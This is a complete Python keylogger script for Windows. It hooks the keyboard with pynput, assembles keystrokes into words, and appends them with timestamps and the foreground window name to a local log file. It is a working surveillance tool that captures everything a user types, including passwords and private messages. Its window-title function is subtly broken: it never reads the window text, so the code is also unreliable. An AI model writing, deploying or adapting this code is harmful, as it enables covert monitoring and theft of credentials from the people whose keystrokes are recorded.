import ctypes
import os
import time
from pynput import keyboard

user32 = ctypes.windll.user32

user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]

LOG_FILE = "key_log.txt"
current_word = []
last_window = ""

def get_active_window():
    try:
        hwnd = user32.GetForegroundWindow()
        if hwnd:
            buffer_length = 512
            buffer = ctypes.create_unicode_buffer(buffer_length)
            if buffer.value:
                return buffer.value
    except Exception:
        pass
    return "Unknown Window"

def save_word_to_file():
    global current_word, last_window
    if current_word:
        word_str = "".join(current_word)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{last_window} | content: {word_str}]")

        current_word.clear()

def on_press(key):
    global current_word, last_window
    current_window = get_active_window()
    if current_window != last_window and current_word:
        save_word_to_file()

    last_window = current_window

    try:
        current_word.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            current_word.append(" ")
            save_word_to_file()
        elif key == keyboard.Key.enter:
            current_word.append(" [ENTER]")
            save_word_to_file()
        elif key == keyboard.Key.backspace:
            if current_word:
                current_word.pop()

def on_release(key):
    if key == keyboard.Key.esc:
        save_word_to_file()
        print("[*] 正在安全退出...")
        return False
        
def main():
    global last_window
    last_window = get_active_window()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
if __name__ == "__main__":
    main()